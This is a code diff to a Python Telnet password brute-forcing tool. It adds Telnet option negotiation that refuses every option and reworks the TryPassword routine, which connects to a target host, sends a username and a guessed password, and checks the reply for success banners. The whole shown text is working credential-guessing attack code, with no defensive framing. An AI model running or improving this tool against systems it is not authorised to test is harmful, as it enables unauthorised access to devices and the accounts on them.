@@ -65,16 +65,43 @@ progressLine = ""
 timerThread = None
 stdoutLock = threading.Lock()
 
+def NegotiateTelnet(sock):
+    IAC  = 255  # "Interpret As Command"
+    DO   = 253
+    DONT = 254
+    WILL = 251
+    WONT = 252
+
+    try:
+        # Read and respond to any negotiation commands
+        while True:
+            byte = sock.recv(1)
+            if not byte:
+                break
+
+            if byte[0] == IAC:
+                cmd = sock.recv(2)
+                if len(cmd) < 2:
+                    break
+                option = cmd[1]
+                # Refuse all options
+                if cmd[0] in [DO, DONT]:
+                    sock.send(bytes([IAC, WONT, option]))
+                elif cmd[0] in [WILL, WONT]:
+                    sock.send(bytes([IAC, DONT, option]))
+            else:
+                # Put back the non-IAC byte and exit negotiation
+                break
+    except socket.timeout:
+        pass
+
 def UpdateTimer(startTime):
     while not stopTimer:
         elapsed = time.time() - startTime
         elapsedFmt = time.strftime("%H:%M:%S", time.gmtime(elapsed))
         with stdoutLock:
-            # clear and rewrite the progress line
             sys.stdout.write("\r\033[K" + progressLine + "\n")
-            # write duration on the next line (no clearing)
             sys.stdout.write(f"Duration: {BOLD}{elapsedFmt}{RESET}")
-            # move cursor back up so next progress update overwrites correctly
             sys.stdout.write("\033[F")
             sys.stdout.flush()
         time.sleep(1)
@@ -112,44 +139,34 @@ def TelnetBruteForce(host, port, username, passwords):
 
 def TryPassword(host, port, username, password):
     try:
-        # Create socket and connect to target
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(5)
         sock.connect((host, port))
 
-        # Read until we get 'User:' prompt (Telnet)
-        sock.send(b"\r\n")  # Send an initial newline to get the prompt
-        time.sleep(0.2)  # Wait for the prompt to come back
-        data = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
+        NegotiateTelnet(sock)             # ← handle Telnet negotiation
+        sock.send(b"\r\n")                # ← trigger banner + prompts
+        time.sleep(0.5)
+        data = sock.recv(1024).decode(errors="ignore")
 
-        if not any(prompt in data for prompt in ["User:","user:","Login:","login","Username:","username"]): 
+        # Expect both login and password prompts in the same banner
+        if "login" not in data.lower() or "password" not in data.lower():
             sock.close()
             return False
 
-        # Send username
+        # Send username then password immediately
         sock.send((username + "\r\n").encode())
-        time.sleep(0.2)  # Give some time for the prompt to come back
-
-        # Expecting password prompt
-        data = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
-        if not any(prompt in data for prompt in ["Password","password:","Enter password:","enter password:","Enter your password:","enter your password:","Enter the password:","enter the password"]):
-            sock.close()
-            return False
-
-        # Send password
+        time.sleep(0.2)
         sock.send((password + "\r\n").encode())
         time.sleep(0.2)
 
-        # Get the output after sending the password
-        output = sock.recv(1024).decode(errors="ignore")  # Decode bytes to string
+        output = sock.recv(1024).decode(errors="ignore")
         sock.close()
 
-        # Check if any of the success banners are in the output
         for banner in BANNERS:
             if banner in output:
                 return True
-
         return False
+
     except Exception as e:
         print(f"[!] Error: {e}")
         return False
